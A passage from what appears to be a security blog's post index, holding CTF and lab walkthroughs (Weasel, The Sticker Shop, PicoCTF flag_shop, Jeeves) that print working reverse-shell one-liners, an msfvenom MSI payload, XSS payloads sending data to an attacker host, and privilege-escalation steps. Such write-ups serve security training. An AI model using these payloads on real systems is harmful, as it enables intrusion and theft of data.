it\u0026rsquo;s usually an easy win, so i quickly found that /home/dev-datasci/.local/bin/jupyter can be executed with root privileges without a password.\n(base) dev-datasci@dev-datasci-jup:~/datasci-team$ sudo -l sudo -l matching defaults entries for dev-datasci on dev-datasci-jup: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin user dev-datasci may run the following commands on dev-datasci-jup: (all : all) all (all) nopasswd: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci -c * we have write permissions to /home/dev-datasci/.local/bin/, and since there isn\u0026rsquo;t a jupyter file there, we can create our own.\n(base) dev-datasci@dev-datasci-jup:~/datasci-team$ pwd pwd /home/dev-datasci/datasci-team (base) dev-datasci@dev-datasci-jup:~/datasci-team$ ls -al ../.local/bin ls -al ../.local/bin total 0 drwxrwxrwx 1 dev-datasci dev-datasci 4096 aug 25 2022 . drwx------ 1 dev-datasci dev-datasci 4096 aug 25 2022 .. -rwxrwxrwx 1 dev-datasci dev-datasci 216 aug 25 2022 f2py -rwxrwxrwx 1 dev-datasci dev-datasci 216 aug 25 2022 f2py3 -rwxrwxrwx 1 dev-datasci dev-datasci 216 aug 25 2022 f2py3.8 (base) dev-datasci@dev-datasci-jup:~/datasci-team$ echo \u0026#34;/bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.13.48.55/80 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt; ../.local/bin/jupyter echo \u0026#34;/bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.13.48.55/80 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt; ../.local/bin/jupyter (base) dev-datasci@dev-datasci-jup:~/datasci-team$ chmod +x ../.local/bin/jupyter chmod +x ../.local/bin/jupyter now to leverage our sudo privileges and execute it as root\u0026hellip;\n(base) dev-datasci@dev-datasci-jup:~/datasci-team$ sudo /home/dev-datasci/.local/bin/jupyter sudo /home/dev-datasci/.local/bin/jupyter ┌──(kali㉿kali)-[/tmp/smb] └─$ nc -nvlp 80 listening on [any] 80 ... connect to [10.13.48.55] from (unknown) [10.10.34.193] 50863 bash: cannot set terminal process group (10): invalid argument bash: no job control in this shell root@dev-datasci-jup:/home/dev-datasci/datasci-team# with root privileges, we now have a better chance of escaping the wsl environment and onto the host os. i tried to navigate to the host filesystem under /mnt. it contains a mount to the c drive, but it\u0026rsquo;s empty\u0026hellip;\nroot@dev-datasci-jup:/home/dev-datasci/datasci-team# ls -al /mnt ls -al /mnt total 0 drwxr-xr-x 1 root root 4096 aug 25 2022 . drwxr-xr-x 1 root root 4096 aug 25 2022 .. drwxrwxrwx 1 root root 4096 aug 25 2022 c root@dev-datasci-jup:/home/dev-datasci/datasci-team# ls -al /mnt/c ls -al /mnt/c total 0 drwxrwxrwx 1 root root 4096 aug 25 2022 . drwxr-xr-x 1 root root 4096 aug 25 2022 .. since we are root, we can remount the filesystem.\nroot@dev-datasci-jup:/home/dev-datasci/datasci-team# sudo mount -t drvfs c: /mnt/c sudo mount -t drvfs c: /mnt/c root@dev-datasci-jup:/home/dev-datasci/datasci-team# ls -al /mnt/c ls -al /mnt/c ls: cannot read symbolic link \u0026#39;/mnt/c/documents and settings\u0026#39;: permission denied ls: cannot access \u0026#39;/mnt/c/pagefile.sys\u0026#39;: permission denied ls: \u0026#39;/mnt/c/system volume information\u0026#39;: permission denied total 0 drwxrwxrwx 1 root root 4096 aug 25 2022 $recycle.bin drwxrwxrwx 1 root root 4096 mar 14 2023 . drwxr-xr-x 1 root root 4096 aug 25 2022 .. lrwxrwxrwx 1 root root 12 aug 25 2022 documents and settings drwxrwxrwx 1 root root 4096 aug 25 2022 perflogs drwxrwxrwx 1 root root 4096 aug 25 2022 program files drwxrwxrwx 1 root root 4096 aug 25 2022 program files (x86) drwxrwxrwx 1 root root 4096 mar 13 2023 programdata drwxrwxrwx 1 root root 4096 aug 25 2022 recovery d--x--x--x 1 root root 4096 aug 25 2022 system volume information drwxrwxrwx 1 root root 4096 aug 25 2022 users drwxrwxrwx 1 root root 4096 mar 13 2023 windows drwxrwxrwx 1 root root 4096 dec 22 19:56 datasci-team -????????? ? ? ? ? ? pagefile.sys i tried to find ways to pivot to the host environment like copying the hklm\\sam and hklm\\system registries to dump local sam hashes and searching for credentials in files. unfortunately, all of these lead nowhere.1\nroot@dev-datasci-jup:/home/dev-datasci/datasci-team# cp /mnt/c/windows/system32/config/sam /tmp/sam cp /mnt/c/windows/system32/config/sam /tmp/sam cp: cannot open \u0026#39;/mnt/c/windows/system32/config/sam\u0026#39; for reading: permission denied root@dev-datasci-jup:/home/dev-datasci/datasci-team# cp /mnt/c/windows/system32/config/system /tmp/system cp /mnt/c/windows/system32/config/system /tmp/system cp: cannot open \u0026#39;/mnt/c/windows/system32/config/system\u0026#39; for reading: permission denied i eventually fell back to wsl to look for other clues. we see a ssh private key in the dev-datasci user\u0026rsquo;s home directory.\nroot@dev-datasci-jup:/home/dev-datasci/datasci-team$ ls .. ls .. anaconda3 anacondainstall.sh datasci-team dev-datasci-lowpriv_id_ed25519 rid cycling confirms dev-datasci-lowpriv is a valid user on the windows machine.\n┌──(kali㉿kali)-[/tmp] └─$ nxc smb 10.10.34.193 -u guest -p \u0026#39;\u0026#39; --rid-brute smb 10.10.34.193 445 dev-datasci-jup [*] windows 10 / server 2019 build 17763 x64 (name:dev-datasci-jup) (domain:dev-datasci-jup) (signing:false) (smbv1:false) smb 10.10.34.193 445 dev-datasci-jup [+] dev-datasci-jup\\guest: smb 10.10.34.193 445 dev-datasci-jup 500: dev-datasci-jup\\administrator (sidtypeuser) smb 10.10.34.193 445 dev-datasci-jup 501: dev-datasci-jup\\guest (sidtypeuser) smb 10.10.34.193 445 dev-datasci-jup 503: dev-datasci-jup\\defaultaccount (sidtypeuser) smb 10.10.34.193 445 dev-datasci-jup 504: dev-datasci-jup\\wdagutilityaccount (sidtypeuser) smb 10.10.34.193 445 dev-datasci-jup 513: dev-datasci-jup\\none (sidtypegroup) smb 10.10.34.193 445 dev-datasci-jup 1000: dev-datasci-jup\\dev-datasci-lowpriv (sidtypeuser) smb 10.10.34.193 445 dev-datasci-jup 1001: dev-datasci-jup\\sshd (sidtypeuser) we can therefore ssh onto the windows host os.\n┌──(kali㉿kali)-[/tmp] └─$ ssh -i dev-datasci-lowpriv_id_ed25519 dev-datasci-lowpriv@10.10.34.193 privilege escalation we can use winpeas to facilitate our enumeration. i transferred it to the windows host through scp.\n┌──(kali㉿kali)-[~] └─$ scp -i /tmp/id_rsa ~/winpeasany.exe dev-datasci-lowpriv@10.10.34.193:c:\\users\\datasci-team\\winpeas.exe winpeasany.exe the filename did get jumbled up, so i renamed it for clarity.\ndev-datasci-lowpriv@dev-datasci-jup c:\\users\\dev-datasci-lowpriv\u0026gt;dir volume in drive c has no label. volume serial number is 8aa3-53d1 directory of c:\\users\\dev-datasci-lowpriv 12/22/2024 08:30 pm \u0026lt;dir\u0026gt; . 12/22/2024 08:30 pm \u0026lt;dir\u0026gt; .. 08/25/2022 05:20 am \u0026lt;dir\u0026gt; .ssh 08/25/2022 04:22 am \u0026lt;dir\u0026gt; 3d objects 08/25/2022 04:22 am \u0026lt;dir\u0026gt; contacts 08/25/2022 06:39 am \u0026lt;dir\u0026gt; desktop 08/25/2022 04:22 am \u0026lt;dir\u0026gt; documents 08/25/2022 04:22 am \u0026lt;dir\u0026gt; downloads 08/25/2022 04:22 am \u0026lt;dir\u0026gt; favorites 08/25/2022 04:22 am \u0026lt;dir\u0026gt; links 08/25/2022 04:22 am \u0026lt;dir\u0026gt; music 08/25/2022 04:22 am \u0026lt;dir\u0026gt; pictures 08/25/2022 04:22 am \u0026lt;dir\u0026gt; saved games 08/25/2022 04:22 am \u0026lt;dir\u0026gt; searches 12/22/2024 08:31 pm 9,841,664 usersdatasci-teamwinpeas.exe 08/25/2022 04:22 am \u0026lt;dir\u0026gt; videos 1 file(s) 9,841,664 bytes 15 dir(s) 36,645,306,368 bytes free dev-datasci-lowpriv@dev-datasci-jup c:\\users\\dev-datasci-lowpriv\u0026gt;ren usersdatasci-teamwinpeas.exe winpeas.exe running winpeas reveals a couple things of interest. first, dev-datasci-lowpriv has permissions to run windows installer packages with elevated privileges.\ndev-datasci-lowpriv also has its credentials stored for autologon.\nnow all we need to do is create a malicious .msi file and install it on the windows host for privilege escalation. i generated one using msfvenom.\n┌──(kali㉿kali)-[/tmp] └─$ msfvenom -p windows/shell_reverse_tcp lhost=10.13.48.55 lport=8000 -f msi -o shell.msi [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload no encoder specified, outputting raw payload payload size: 354 bytes final size of msi file: 159744 bytes saved as: shell.msi after transferring it onto our target, we can execute it. i had to explicitly run msiexec as dev-datasci-lowpriv with \u0026ldquo;runas\u0026rdquo;.\ndev-datasci-lowpriv@dev-datasci-jup c:\\users\\dev-datasci-lowpriv\u0026gt;runas /user:dev-datasci-lowpriv \u0026#34;msiexec /quiet /i c:\\users\\dev-datasci-low priv\\shell.msi\u0026#34; enter the password for dev-datasci-lowpriv: attempting to start msiexec /quiet /i c:\\users\\dev-datasci-lowpriv\\shell.msi as user \u0026#34;dev-datasci-jup\\dev-datasci-lowpriv\u0026#34; ... and now we have a shell as nt authority\\system.\n┌──(kali㉿kali)-[/tmp] └─$ rlwrap nc -nvlp 8000 listening on [any] 8000 ... connect to [10.13.48.55] from (unknown) [10.10.34.193] 53713 microsoft windows [version 10.0.17763.3287] (c) 2018 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt;whoami whoami nt authority\\system you can read still the flags here, but afaik getting command execution on windows isn\u0026rsquo;t possible from the mounted filesystem.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","title":"Weasel"},{"date":"2024-11-29","image":"","imageAlt":"","link":"http://localhost:1313/posts/the_sticker_shop/","summary":"\u003cp\u003e\u003cimg src=\"/img/the_sticker_shop/the_sticker_shop.png#center\" alt=\"The Sticker Shop\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://tryhackme.com/r/room/thestickershop\"\u003eThe Sticker Shop\u003c/a\u003e is an easy-rated challenge on Tryhackme. We exfiltrate \u003ccode\u003eflag.txt\u003c/code\u003e from the web server through a XSS attack.\u003c/p\u003e","tags":["THM","Web Exploitation","XSS"],"text":"\ndescription the sticker shop is an easy-rated challenge on tryhackme. we exfiltrate flag.txt from the web server through a xss attack.\nwalkthrough we are told that we need to read the flag at http://10.10.102.204:8080/flag.txt. however, visiting the url, we are met with a 401 unauthorized message, meaning we are not authenticated to view the file.\nif we backtrack to the webapp\u0026rsquo;s homepage, we see that there is a page for submitting feedback where we can presumably send content to the sticker shop staff. this might be our way in.\ni started by sending a simple xss payload to attempt to exfiltrate user cookies.\n\u0026lt;script\u0026gt;new image().src=\u0026#34;http://10.13.48.55/?c=\u0026#34;+document.cookie\u0026lt;/script\u0026gt; ┌──(kali㉿kali)-[/tmp]\r└─$ python3 -m http.server 80\rserving http on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\r10.10.102.204 - - [29/nov/2024 19:56:47] \u0026#34;get /?c= http/1.1\u0026#34; 200 -\r10.10.102.204 - - [29/nov/2024 19:56:58] \u0026#34;get /?c= http/1.1\u0026#34; 200 - unfortunately, this does not work. the webapp may have some sort of defense mechanism (e.g. httponly). heck, it may not be using cookies at all. without further information, it will be difficult to obtain any account secrets, if they exist in the first place. we need to focus on directly accessing flag.txt through our xss payload instead.\na quick and dirty way of doing this would be embedding flag.txt\u0026rsquo;s contents into a query string. below is a payload that reads flag.txt on the server side and sends the data back to us with a get request.\n\u0026lt;script\u0026gt; function senddata(data) { const url = new url(\u0026#34;http://10.13.48.55\u0026#34;); url.searchparams.append(\u0026#34;data\u0026#34;, data); fetch(url) } fetch(\u0026#34;http://127.0.0.1:8080/flag.txt\u0026#34;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { senddata(data); }) \u0026lt;/script\u0026gt; beyond pwn but what if you want to read a file that is much larger, or you don\u0026rsquo;t want the data to be visible in the url, perhaps for greater stealth? in that case, you would be better off using post instead of get. for unstructured data, sending data as plaintext will suffice.\n\u0026lt;script\u0026gt; function senddata(data){ fetch(\u0026#34;http://10.13.48.55\u0026#34;, { method: \u0026#34;post\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;text/plain\u0026#34; }, body: data }) } fetch(\u0026#34;http://127.0.0.1:8080/flag.txt\u0026#34;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { senddata(data) }) \u0026lt;/script\u0026gt; ┌──(kali㉿kali)-[~]\r└─$ nc -nvlp 80\rlistening on [any] 80 ...\rconnect to [10.13.48.55] from (unknown) [10.10.102.204] 60968\rpost / http/1.1\rhost: 10.13.48.55\rconnection: keep-alive\rcontent-length: 45\ruser-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) headlesschrome/119.0.6045.105 safari/537.36\rcontent-type: text/plain\raccept: */*\rorigin: http://127.0.0.1:8080\rreferer: http://127.0.0.1:8080/\raccept-encoding: gzip, deflate\rthm{\u0026lt;flag\u0026gt;} for structured data, using json may be a better option.\n\u0026lt;script\u0026gt; function senddata(data){ fetch(\u0026#34;http://10.13.48.55\u0026#34;, { method: \u0026#34;post\u0026#34;, headers: { \u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34; }, body: json.stringify(data) }) } fetch(\u0026#34;http://127.0.0.1:8080/flag.txt\u0026#34;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { senddata(data) }) \u0026lt;/script\u0026gt; the problem is that the post request is no longer \u0026ldquo;simple\u0026rdquo; because the content type is now application/json, so the browser now sends a preceding preflight request, meaning netcat is out of the question\u0026hellip;\n┌──(kali㉿kali)-[/tmp]\r└─$ nc -nvlp 80\rlistening on [any] 80 ...\rconnect to [10.13.48.55] from (unknown) [10.10.102.204] 52614\roptions / http/1.1\rhost: 10.13.48.55\rconnection: keep-alive\raccept: */*\raccess-control-request-method: post\raccess-control-request-headers: content-type\rorigin: http://127.0.0.1:8080\ruser-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) headlesschrome/119.0.6045.105 safari/537.36\rsec-fetch-mode: cors\rreferer: http://127.0.0.1:8080/\raccept-encoding: gzip, deflate we need to respond appropriately in order to receive the post request containing flag.txt. specifically, we need to respond with the correct access-control-allow-origin, access-control-allow-methods, and access-control-allow-headers headers.\naccess-control-allow-origin: specifies what domains are allowed to access a resource.\raccess-control-allow-methods: indicates which http methods are allowed.\raccess-control-allow-headers: represents the http headers that are permitted. now to whitelist any origin1, the http post and options, as well as the content-type header. i spun up a flask server to do this:\nfrom flask import flask, request app = flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;post\u0026#39;, \u0026#39;options\u0026#39;]) def handler(): if request.method == \u0026#39;options\u0026#39;: headers = { \u0026#39;access-control-allow-origin\u0026#39; : \u0026#39;*\u0026#39;, \u0026#39;access-control-allow-methods\u0026#39; : \u0026#39;post, options\u0026#39;, \u0026#39;access-control-allow-headers\u0026#39; : \u0026#39;content-type\u0026#39; } return \u0026#39;\u0026#39;, 200, headers elif request.method == \u0026#39;post\u0026#39;: data = request.get_json() print(data) return \u0026#39;\u0026#39;, 200 return \u0026#39;\u0026#39;, 405 if __name__ == \u0026#39;__main__\u0026#39;: app.run() and now, we should successfully receive our flag.\nthe request from flag shop comes from a random high port and there is no built-in method in cors for wildcard port matching.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","title":"The Sticker Shop"},{"date":"2024-11-20","image":"","imageAlt":"","link":"http://localhost:1313/posts/flag_shop/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eflag_shop is a challenge on PicoCTF where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.\u003c/p\u003e","tags":["Code Review","Integer Overflow","PicoCTF"],"text":"description flag_shop is a challenge on picoctf where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.\nwalkthrough functionality testing connecting to the pico server, we get a menu with several options.\n┌──(kali㉿kali)-[/tmp]\r└─$ nc jupiter.challenges.picoctf.org 9745\rwelcome to the flag exchange\rwe sell flags\r1. check account balance\r2. buy flags\r3. exit\renter a menu selection we can see our account balance.\nenter a menu selection\r1\rbalance: 1100 we can also buy flags, of which there are two options. options 1 costs 900 each, whereas option 2, the \u0026ldquo;1337 flag\u0026rdquo;, costs 100000 each.\nenter a menu selection\r2\rcurrently for sale\r1. defintely not the flag flag\r2. 1337 flag\r1\rthese knockoff flags cost 900 each, enter desired quantity 2\rcurrently for sale\r1. defintely not the flag flag\r2. 1337 flag\r2\r1337 flags cost 100000 dollars, and we only have 1 in stock\renter 1 to buy one we are asked to buy a flag, presumably the 1337 flag, so let\u0026rsquo;s get started.\ncode review the first thing that caught my eye was the usage the unsecure scanf(). scanf() takes data from standard input and stores it to the address of a variable. however, it does not set a limit on the size of user input, meaning it is vulnerable to overflow. for this challenge, we do not need to exploit scanf(), but it is still something worth keeping in mind.\nwe also see that the store.c uses an integer to store the total cost of the flags in total_cost, meaning it can be interpreted as positive or negative. total_cost is derived by multiplying the cost of flag 1 (900) with the number of flags our user wants to buy, so the number of flags we buy could flip the most significant bit of total_cost to 1, turning it into a negative number.\nif(auction_choice == 1){ printf(\u0026#34;these knockoff flags cost 900 each, enter desired quantity\\n\u0026#34;); int number_flags = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;number_flags); if(number_flags \u0026gt; 0){ int total_cost = 0; total_cost = 900*number_flags; printf(\u0026#34;\\nthe final cost is: %d\\n\u0026#34;, total_cost); if(total_cost \u0026lt;= account_balance){ account_balance = account_balance - total_cost; printf(\u0026#34;\\nyour current balance after transaction: %d\\n\\n\u0026#34;, account_balance); } else{ printf(\u0026#34;not enough funds to complete purchase\\n\u0026#34;); } } } exploitation in two\u0026rsquo;s complement, the most significant bit, or leftmost digit determines whether a number is positive (0) or negative (1). when our total cost ends up being greater than the maximum positive integer, the cost becomes negative if the most significant bit is 1. since the price of a flag is 900, we can overflow our cost by buying maximum_integer/price_per_flag flags. of course, this value needs to be rounded up (or +1 if the quotient is a whole number).\n┌──(kali㉿kali)-[/tmp]\r└─$ python3\rpython 3.12.6 (main, sep 7 2024, 14:20:15) [gcc 14.2.0] on linux\rtype \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information.\r\u0026gt;\u0026gt;\u0026gt; import math\r\u0026gt;\u0026gt;\u0026gt; math.ceil(2147483647/900)\r2386093\r\u0026gt;\u0026gt;\u0026gt; 2147483647/900\r2386092.941111111 however, when i try to buy 2386093 flags, i am thrown deep into debt!\nthese knockoff flags cost 900 each, enter desired quantity\r2386093\rthe final cost is: -2147483596\ryour current balance after transaction: -2147482600 let us figure out why this is happening. i\u0026rsquo;ve provided a script below to find the binary representation of an integer.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;strings.h\u0026gt; void getbin(int); int main(int argc, char* argv[]) { if (argc != 2) { printf(\u0026#34;usage: %s \u0026lt;num\u0026gt;\u0026#34;, argv[0]); exit(1); } getbin(atoi(argv[1])); return 0; } void getbin(int num) { char bin[33]; unsigned short index = 0; bin[index] = (num \u0026gt;\u0026gt; 31 \u0026amp; 1) + 48; for (int i = 1 \u0026lt;\u0026lt; 30; i \u0026gt; 0; i \u0026gt;\u0026gt;= 1) { index++; num \u0026amp; i ? (bin[index] = \u0026#39;1\u0026#39;) : (bin[index] = \u0026#39;0\u0026#39;); } bin[32] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;number: %d\\n\u0026#34;, num); printf(\u0026#34;binary: %s\\n\u0026#34;, bin); return; } calculating our remaining funds, we get 2147483596.\n┌──(kali㉿kali)-[/tmp]\r└─$ ./int2bin $(( 0-2386093*900 ))\rnumber: 2147483596\rbinary: 01111111111111111111111111001100 however, we start with 1100 in our balance, not 0. if we recalculate our balance with that accounted for, we get -2147482600.\n┌──(kali㉿kali)-[/tmp]\r└─$ ./int2bin $(( 1100-2386093*900 ))\rnumber: -2147482600\rbinary: 10000000000000000000010000011000 the easiest way to fix this debacle would be to add 1100/900 when calculating the number of flags we need to buy since we will need to overflow an additional 1100 for flags that cost 900 each.\n\u0026gt;\u0026gt;\u0026gt; math.ceil(2147483647/900+1100/900)\r2386095 and now we have 2147482896 in our account after the transaction, more than enough to buy the 1337 flag.\nthese knockoff flags cost 900 each, enter desired quantity\r2386095\rthe final cost is: -2147481796\ryour current balance after transaction: 2147482896 currently for sale\r1. defintely not the flag flag\r2. 1337 flag\r2\r1337 flags cost 100000 dollars, and we only have 1 in stock\renter 1 to buy one1\ryour flag is: picoctf{m0n3y_\u0026lt;redacted\u0026gt;}\rwelcome to the flag exchange\rwe sell flags ","title":"PicoCTF: flag_shop"},{"date":"2024-11-11","image":"","imageAlt":"","link":"http://localhost:1313/posts/jeeves/","summary":"\u003cp\u003e\u003cimg src=\"/img/jeeves/jeeves.png#center\" alt=\"Jeeves\"\u003e\u003c/p\u003e\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eJeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator\u0026rsquo;s NTLM hash.\u003c/p\u003e","tags":["Broken Access Control","Broken Authentication","HTB","Jenkins","KeePass","Windows"],"text":"\ndescription jeeves is a medium-difficult machine on hackthebox. there is a jenkins dashboard where unauthenticated users can access the script console and get a reverse shell. after the initial foothold, gaining access to a keepass database file reveals administrator\u0026rsquo;s ntlm hash.\nrecon starting off with a nmap scan:\n# nmap 7.94svn scan initiated mon nov 11 13:02:01 2024 as: nmap -p- -a -v -t4 -on /tmp/nmap.scan 10.10.10.63 adjust_timeouts2: packet supposedly had rtt of -211723 microseconds. ignoring time. adjust_timeouts2: packet supposedly had rtt of -211723 microseconds. ignoring time. nmap scan report for 10.10.10.63 host is up (0.043s latency). not shown: 65531 filtered tcp ports (no-response) port state service version 80/tcp open http microsoft iis httpd 10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace |_http-server-header: microsoft-iis/10.0 |_http-title: ask jeeves 135/tcp open msrpc microsoft windows rpc 445/tcp open microsoft-ds microsoft windows 7 - 10 microsoft-ds (workgroup: workgroup) 50000/tcp open http jetty 9.4.z-snapshot |_http-server-header: jetty(9.4.z-snapshot) |_http-title: error 404 not found warning: osscan results may be unreliable because we could not find at least 1 open and 1 closed port device type: general purpose running (just guessing): microsoft windows 2008 (87%) os cpe: cpe:/o:microsoft:windows_server_2008:r2 aggressive os guesses: microsoft windows server 2008 r2 (87%) no exact os matches for host (test conditions non-ideal). uptime guess: 0.007 days (since mon nov 11 12:55:57 2024) network distance: 2 hops tcp sequence prediction: difficulty=260 (good luck!) ip id sequence generation: busy server or unknown class service info: host: jeeves; os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-time: | date: 2024-11-12t00:05:55 |_ start_date: 2024-11-11t23:57:06 | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required |_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) traceroute (using port 445/tcp) hop rtt address 1 43.96 ms 10.10.14.1 2 45.71 ms 10.10.10.63 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at mon nov 11 13:05:35 2024 -- 1 ip address (1 host up) scanned in 214.46 seconds i found several services, including smb, rpc, and two http servers on ports 80 and 50000. enumerating the web server on port 80 and smb do not reveal anything interesting. i was able to use rpc to find some endpoints, but i did not see anyway i could exploit jeeves with the information.\n┌──(kali㉿kali)-[~] └─$ impacket-rpcdump -p 135 10.10.10.63 impacket v0.12.0.dev1 - copyright 2023 fortra [*] retrieving endpoint list from 10.10.10.63 protocol: [ms-rsp]: remote shutdown protocol provider: wininit.exe uuid : d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 bindings: ncacn_ip_tcp:10.10.10.63[49664] ncalrpc:[windowsshutdown] ncacn_np:\\\\jeeves[\\pipe\\initshutdown] ncalrpc:[wmsgkrpc097380] protocol: n/a provider: winlogon.exe uuid : 76f226c3-ec14-4325-8a99-6a46348418af v1.0 bindings: ncalrpc:[windowsshutdown] ncacn_np:\\\\jeeves[\\pipe\\initshutdown] ncalrpc:[wmsgkrpc097380] ncalrpc:[wmsgkrpc097a31] protocol: n/a provider: n/a uuid : 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 bindings: ncalrpc:[lrpc-f01d6a34deb1026cb0] ncalrpc:[dabrpc] ncalrpc:[csebpub] ncalrpc:[lrpc-f24b240fdec2bc8c52] ncalrpc:[lrpc-bb6163cae863dbd5f9] ncalrpc:[lrpc-82dd959ab6b7e8366d] ncacn_np:\\\\jeeves[\\pipe\\lsm_api_service] ncalrpc:[lsmapi] ncalrpc:[lrpc-300bf2e2daeee2de9a] ncalrpc:[actkernel] ncalrpc:[umpo] ... however, i did find an interesting directory on the port 50000 website.\n┌──(kali㉿kali)-[~] └─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/discovery/web-content/raft-large-words.txt -t 50 -c 404 -n ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by ben \u0026#34;epi\u0026#34; risher 🤓 ver: 2.11.0 ───────────────────────────┬────────────────────── 🎯 target url │ http://10.10.10.63:50000 🚀 threads │ 50 📖 wordlist │ /usr/share/seclists/discovery/web-content/raft-large-words.txt 💢 status code filters │ [404] 💥 timeout (secs) │ 7 🦡 user-agent │ feroxbuster/2.11.0 💉 config file │ /etc/feroxbuster/ferox-config.toml 🔎 extract links │ true 🏁 http methods │ [get] 🚫 do not recurse │ true ───────────────────────────┴────────────────────── 🏁 press [enter] to use the scan management menu™ ────────────────────────────────────────────────── 404 get 11l 26w -c auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 302 get 0l 0w 0c http://10.10.10.63:50000/askjeeves =\u0026gt; http://10.10.10.63:50000/askjeeves/ [####################] - 2m 119601/119601 0s found:1 errors:0 [####################] - 2m 119601/119601 1048/s http://10.10.10.63:50000/ we find a jenkins dashboard.\njenkins is an open source ci/cd server. in this case, anonymous users have full access to the dashboard. this happens when the jenkins authorization strategy is set to unsecured. after compromising the machine, i confirmed this was the case by checking config.xml and finding the unsecured authorization strategy in use.\n\u0026lt;authorizationstrategy class=\u0026quot;hudson.security.authorizationstrategy$unsecured\u0026quot;/\u0026gt;\nfoothold we can leverage our permissions to access the script console by going to \u0026ldquo;mange jenkins\u0026rdquo; \u0026gt; \u0026ldquo;script console\u0026rdquo;.\nhere we can execute a groovy code to get a reverse shell. i got mine from revshells, but it is worth noting that java shells also work because groovy is a superset of java and also runs on the jvm.\n┌──(kali㉿kali)-[/tmp] └─$ rlwrap nc -nvlp 8000 listening on [any] 8000 ... connect to [10.10.14.31] from (unknown) [10.10.10.63] 49681 microsoft windows [version 10.0.10586] (c) 2015 microsoft corporation. all rights reserved. c:\\users\\administrator\\.jenkins\u0026gt; privilege escalation i always go for low-hanging fruit first when escalating privileges. looking at my user privilege, i saw that we have the seimpersonateprivilege. we can potentially impersonate a high-privileged user.\nc:\\temp\u0026gt;whoami /priv whoami /priv privileges information ---------------------- privilege name description state ============================= ========================================= ======== seshutdownprivilege shut down the system disabled sechangenotifyprivilege bypass traverse checking enabled seundockprivilege remove computer from docking station disabled seimpersonateprivilege impersonate a client after authentication enabled secreateglobalprivilege create global objects enabled seincreaseworkingsetprivilege increase a process working set disabled setimezoneprivilege change the time zone disabled unfortunately, this turns out to be a false lead. we\u0026rsquo;ll have to look for other privesc vectors.\nc:\\temp\u0026gt;.\\godpotato-net4.exe -cmd \u0026#34;cmd /c whoami\u0026#34; .\\godpotato-net4.exe -cmd \u0026#34;cmd /c whoami\u0026#34; [*] combasemodule: 0x140717164658688 [*] dispatchtable: 0x140717166622152 [*] useprotseqfunction: 0x140717166124880 [*] useprotseqfunctionparamcount: 5 [*] hookrpc [*] start pipeserver [*] createnamedpipe \\\\.\\pipe\\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\\pipe\\epmapper [*] trigger rpcss [*] dcom obj guid: 00000000-0000-0000-c000-000000000046 [*] dcom obj ipid: 00003c02-0f34-ffff-9033-ef4aa84d1797 [*] dcom obj oxid: 0xb7f5e435d7866f08 [*] dcom obj oid: 0x59d6cba54f6519d9 [*] dcom obj flags: 0x281 [*] dcom obj publicrefs: 0x0 [*] marshal object bytes len: 100 [*] unmarshal object [*] unmarshalobject: 0x80070776 [!] failed to impersonate security context token eventually, i come across a keepass database file.\nc:\\\u0026gt;dir /s /b *.kdbx dir /s /b *.kdbx c:\\users\\kohsuke\\documents\\ceh.kdbx keepass files are password-protected and i don\u0026rsquo;t have the utilities to crack the password on jeeves, so i set up a smb share to exfiltrate the file to my attacker machine.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-smbserver transfer /tmp/transfer -smb2support impacket v0.12.0.dev1 - copyright 2023 fortra [*] config file parsed [*] callback added for uuid 4b324fc8-1670-01d3-1278-5a47bf6ee188 v:3.0 [*] callback added for uuid 